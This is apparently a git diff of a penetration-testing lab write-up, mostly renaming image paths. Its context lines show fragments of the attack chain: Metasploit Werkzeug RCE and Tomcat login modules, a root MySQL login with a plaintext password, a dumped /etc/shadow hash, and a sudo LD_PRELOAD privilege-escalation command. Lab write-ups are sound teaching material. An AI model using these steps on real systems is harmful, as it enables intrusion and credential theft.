@@ -104,7 +104,7 @@ use exploit/multi/http/werkzeug_debug_rce
 
 ![](<../../../../.gitbook/assets/image (49) (1).png>)
 
-![](<../../../../.gitbook/assets/image (20) (1).png>)
+![](<../../../../.gitbook/assets/image (20) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (59) (1) (1).png>)
 
@@ -120,7 +120,7 @@ use exploit/multi/http/werkzeug_debug_rce
 mysql -h 192.6.232.4 -u root -pfArFLP29UySm4bZj
 ```
 
-![](<../../../../.gitbook/assets/image (41) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (41) (1) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (61) (1) (1).png>)
 
@@ -128,7 +128,7 @@ mysql -h 192.6.232.4 -u root -pfArFLP29UySm4bZj
 
 ![](<../../../../.gitbook/assets/image (11).png>)
 
-![](<../../../../.gitbook/assets/image (54) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (54) (1) (1) (1) (1).png>)
 
 ### Exploit
 
@@ -161,8 +161,6 @@ dirb http://192.6.232.5:8080
 ![](<../../../../.gitbook/assets/image (33) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (44).png>)
-
-
 
 ```
 use auxiliary/scanner/http/tomcat_mgr_login
@@ -213,8 +211,6 @@ robert:x:999:999:robert:/home/robert:
 robert:$6$D4O99Z5L$Q38CW.ym42GmIbjZRh8DA2rtLHxXgMj.ahVbrBrbWvuBXmP555cGuLG1hkQE1R0eQVX48Rs7yecdU7V96u5Tf0:17822::::::
 ```
 
-
-
 ![](<../../../../.gitbook/assets/image (67) (1) (1).png>)
 
 ![](<../../../../.gitbook/assets/image (63) (1) (1) (1).png>)
@@ -264,14 +260,6 @@ sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo
 
 ![FLAG3: 560648FC63F090A8CF776326DC13FAC7](<../../../../.gitbook/assets/image (50) (1).png>)
 
-
-
-
-
-
-
-
-
 ## Resources
 
 * [https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld\_preload](https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld\_preload)
@@ -279,4 +267,3 @@ sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo
 * [https://gtfobins.github.io/#](https://gtfobins.github.io/#)
 * [https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#msfvenom-reverse-shell](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat#msfvenom-reverse-shell)
 * [https://www.exploit-db.com/exploits/37814](https://www.exploit-db.com/exploits/37814)
-
